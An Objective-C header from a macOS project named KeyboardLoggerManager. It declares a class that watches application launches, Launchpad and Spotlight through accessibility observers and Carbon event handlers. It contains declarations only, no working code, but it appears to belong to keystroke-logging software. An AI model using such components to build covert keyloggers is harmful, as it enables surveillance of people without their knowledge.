//
//  ApplicationLifeCycleNotifier.h
//  KeyboardLoggerManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <Carbon/Carbon.h>

@protocol  ApplicationLifeCycleDelegate;
@class AppProcessKilledNotifier;

@interface ApplicationLifeCycleNotifier : NSObject {
@private
    id <ApplicationLifeCycleDelegate> mApplicationLifeCycleDelegate;
    
    AXObserverRef mObserver1;
    EventHandlerRef mCarbonEventsRef;
    
    NSThread *mLaunchpadDetectorThread;
    NSThread *mSpotlightDetectorThread;
    AppProcessKilledNotifier *mSpotlightKilledNotifier;
    BOOL isOSX_10_10_OrGreater;
}

@property (nonatomic, assign) id <ApplicationLifeCycleDelegate> mApplicationLifeCycleDelegate;
@property (assign) NSThread *mLaunchpadDetectorThread;
@property (assign) NSThread *mSpotlightDetectorThread;

-(id) initWithALCDelegate:(id <ApplicationLifeCycleDelegate>) aApplicationLifeCycle;

-(void) startNotify;
-(void) stopNotify;

@end
